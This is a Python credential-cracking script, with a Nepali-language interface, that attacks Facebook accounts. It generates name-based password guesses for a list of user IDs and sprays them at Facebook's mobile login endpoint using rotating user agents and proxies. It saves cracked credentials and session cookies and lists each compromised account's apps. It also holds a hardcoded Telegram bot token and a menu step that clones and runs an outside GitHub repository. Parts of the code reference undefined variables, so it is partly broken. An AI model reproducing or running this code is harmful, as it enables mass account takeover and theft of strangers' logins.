#-----------------[ MR-SURAJ ]-------------------#
 
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
time.sleep(2)
 

#------------------[ MR-SURAJ ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
    prox=open('.prox.txt','r').read().splitlines()
#------------------[ USER-AGENT ]-------------------#
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='SamsungBrowser'
    e=random.randrange(100, 9999)
    f='NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)
for xx in range(1000):    
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
def uaku():
    try:
        ua=open('bbnew.txt','r').read().splitlines()
        for ub in ua:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
        TOKEN = "7001615214:AAGRNRiSfDilqr8iFcL8009ks8ywpb590qk"
        ua=open('bbnew.txt','w')
        aa=re.findall('line">(.*?)<',str(a))
        for un in aa:
            ua.write(un+'\n')
        ua=open('bbnew.txt','r').read().splitlines()     
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
cooki = []
cpxx = []
#------------[ HEART- ]--------------#
 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[38;5;50m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
 
###----------[ ANSII COLOR STYLE ]---------- ###
 
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu
 
###----------[ RICH COLOR STYLE ]---------- ###
 
Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu
 
#--------------------[ CONVERTER-BULAN ]--------------#
 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
chat_id = "5850908645"
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
CPc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    def saurav_dai(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
#------------------[ MAIN ]-----------------#
print("\033[1;37m [\u001b[36m•\033[1;37m] THANKS FOR USING! \033[1;37m")
#------------------[ MACHINE-SUPPORT ]---------------#

def restart():
	os.system(f'python {__file__}')
	os.system('exit')
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def linex():
	print("""\x1b[37m----------------------------------------------""")
def cls():
	os.system('clear')
	banner()
	info()
response = requests.get("https://api.ipify.org?format=json")
ipadd = response.json()["ip"]    
logo ="""░██████╗██╗░░░██╗██████╗░░█████╗░░░░░░██╗
██╔════╝██║░░░██║██╔══██╗██╔══██╗░░░░░██║
╚█████╗░██║░░░██║██████╔╝███████║░░░░░██║
░╚═══██╗██║░░░██║██╔══██╗██╔══██║██╗░░██║
██████╔╝╚██████╔╝██║░░██║██║░░██║╚█████╔╝
╚═════╝░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░
->[-----------------------------------]<-    
\033[1;37m×->\033[1;32mहजुर हरु को बाउ सुरज भुसाल हो !\033[1;37m                                                     
\033[1;37;1m-----------------------------------------------
 \033[1;36m[•] लेखक -> \033[1;37m     -> \033[1;37m×->\033[1;32mसुरज भुसाल\033[1;37m
 \033[1;36m[•] GITHUB -> \033[1;37m    ->  \033[1;37m×->\033[1;32mFIGHTERXJOD\033[1;37m
 \033[1;36m[•] फेसबुक -> \033[1;37m  -> : \033[1;37m×->\033[1;32mSU RAJ VHUSAL\033[1;37m
 \033[1;36m[•]उपकरण/ -> \033[1;37m   ->  \033[1;97m : \x1b[97m\033[37;41m भुक्तान गरियो\033[0;m
 \033[1;36m[•] संस्करण -> \033[1;37m   ->  \033[1;36m6 \033[1;37m
  
-----------------------------------------------"""
meyermarexudi =("""""")    
alltimexudi =(""" \033[32;1m[-]""")
xudartimenai =(""" \033[32;1m[+] आदेश प्रयोग गर्न प्रशासकलाई सम्पर्क गर्नुहोस्""")
fuckyoursali =(""" \033[32;1m[𝟷] तपाईंको टोकन सफल स्वीकृत भयो""")
xudinaministar =(""" \033[38;1m[-] महत्त्वपूर्ण नोट """)
hedaborakarent =(""" \033[35;1m[𝟸] 𝙵𝚄𝙲𝙺 𝙱𝚈𝙿𝙰𝚂𝙰𝚁 𝙲𝙷𝙰𝙺𝙴 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰  """)

                  #____APPROVAL SYSTEM ADD_____#
os.system('clear')
print(logo)
def meyexudi():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "H".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/FIGHTERXJOD/FB-CLONING/blob/main/approval.txt').text
    if id in httpCaht:
      msg = str(os.geteuid())
      #time.sleep(0.5)
      print()
      pass
    else:
      print(meyermarexudi)
      print(' \x1b[1;97m[•] वाइफाइ र डाटा दुवै एस आदेश मा काम गर्छा')
      print(" \x1b[0m[•] YOUR KEY :\033[1;35m "+id)
      input(' \033[1;37m[•] यदि तपाईं किन्न चाहनुहुन्छ भने त्यसपछि इन्टर थिच्नुहोस् ')
      os.system('am start https://www.facebook.com/surajexegod'),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python runv6.py")
def naima():
	os.system('clear')
print('   लगइन गर्न को लागी USERNAME र PASSWORD प्रविष्ट गर्नुहोस्')	
print('-----------------------------------------------')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input(' \033[1;37m [\u001b[36m•\033[1;37m] प्रयोगकर्ता नाम प्रविष्ट गर्नुहोस्: ')
    password = input(' \033[1;37m [\u001b[36m•\033[1;37m] पासवर्ड प्रविष्ट गर्नुहोस्: ')

    if username == 'HITLER' and password == 'V6':
        print(' ')
        break
    else:
        print(' गलत पास कृपया पुन प्रयास गर्नुहोस् ')
        attemps += 1
        continue
os.system('clear')
pass
 


#---------------MENU ]----------------#

def menu():
    os.system('clear')
    print(logo)
    print("\033[1;37m[\u001b[36m•\033[1;37m] आजको मिति :\033[1;93m "+date)
    linex()
    print(f"""[\u001b[36m1\033[1;37m] क्र्याक फाइल  """)
    print(f"""[\u001b[36m2\033[1;37m] फाइल सिर्जना गर्नुहोस् """)
    print("""[\u001b[36m0\033[1;37m] बाहिर निस्कनु""")
    linex()
    HEART = input('\033[1;37m[\u001b[36m•\033[1;37m] छान्नुहोस्: ')
    if HEART in ['3']:
        contact()
    elif HEART in ['1']:
        crack_file()
    elif HEART in ['2','02']:
        creattt()
    elif HEART in ['4']:
        wthap()
        menu()
    else:
        linex()
        animation(' [×] सही चयन गर्नुहोस् ')
        back()
 
 #----------------------[ CREATE-MENU ]----------------------#
def creattt():
	linex()
	animation(' [\u001b[36m•\033[1;37m] आदेश लोड हुदै छ')
	linex()
	os.system('rm -rf HARRYv6')
	os.system('git clone --depth=1 https://github.com/HARRY-EXE/HARRYv6')
	os.system('cd HARRYv6 && python3 run.py')
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    linex()
    o = input(' [\u001b[36m•\033[1;37m] फाइल नाम : ')
    try:lin = open(o).read().splitlines()
    except:
        linex()
        animation(' [×] फाइल फेला परेन')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    linex()
    print(" [\u001b[36m1\033[1;37m] पुराना आईडी मात्र")
    print(" [\u001b[36m2\033[1;37m] नयाँ आईडी मात्र")
    print(" [\u001b[36m3\033[1;37m] दुवै मिश्रित आईडी(सिफारिस गरियेको)")
    linex()
    hu = input(' [\u001b[36m•\033[1;37m] छान्नुहोस् : ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    linex()
    print(" [\u001b[36m•\033[1;37m] लगइन विधि ")
    linex()
    print(" [\u001b[36m1\033[1;37m] विधि 1 (सिफारिस गरियेको)")
    print(" [\u001b[36m2\033[1;37m] विधि 2")
    linex()
    hc = input(' [\u001b[36m•\033[1;37m] छान्नुहोस् : ')
    linex()                              
    if hc in ['1','01']:
        method.append('mobile')    
    else:
        method.append('mobile')
    print(" [\u001b[36m•\033[1;37m] चेकपोइन्ट आईडी विकल्पहरू ")
    linex()
    print(" [\u001b[36m1\033[1;37m] चेकपोइन्ट खाता देखाउनुहोस्")
    print(" [\u001b[36m2\033[1;37m] चेकपोइन्ट खाताहरू लुकाउनुहोस्")
    linex()
    saurab = input(' [\u001b[36m•\033[1;37m] छान्नुहोस्  : ')
    if saurab in ['y','Y','111','01','11','1']:
       cpxx.append('y')
    else:
       cpxx.append('n')  
    linex()
    print(" [\u001b[36m•\033[1;37m] कुकी विकल्पहरू")
    linex()
    print(" [\u001b[36m1\033[1;37m] कुकीहरू देखाउनुहोस्")
    print(" [\u001b[36m2\033[1;37m] कुकीहरू लुकाउनुहोस्")
    linex()
    saurav = input(' [\u001b[36m•\033[1;37m] छान्नुहोस् : ')
    linex()                              
    if saurav in ['1','01']:
        cooki.append('y')   
    else:
        cooki.append('n')   
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(" \033[1;37m[\u001b[36m•\033[1;37m] तपाईंले क्लोन सुरु गर्न थालेको समय : "+time.strftime("%H:%M")+" "+ tag)
    print(f' [\u001b[36m•\033[1;37m] सम्पूर्ण अकाउंट: \u001b[36m',str(len(id)))
    linex()
    print(f' \u001b[36m>> \033[1;37m️प्रत्येक 5 मिनेटमा उडान मोड प्रयोग गर्नुहोस् ')
    linex()
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'123@')
                                                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(nmf)
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'123@')   
                                        
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    linex()
    print('\033[97;1m[\033[92;1m+\033[97;1m] क्लोनिङ पूरा समय :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    linex()
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python runv6.py")
    exit() 
#------------------[ METHODE-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \u001b[37m[SURAJ-DON] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"m.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"www.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("K3SH9V")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("SURAJ")}-OK] {idf} │ {pw} {P}')
				cek_apk(kuki)
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				jones(idf,pw,kuki)
				ok.append(wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#----------------[ ID-CHECKER ]--------------------------#

def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s  \033[0m➛ %s"%(P,game[i].replace("Expired"," Expired")))
	except AttributeError:
		print ("\r    %s \033[0mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	menu()

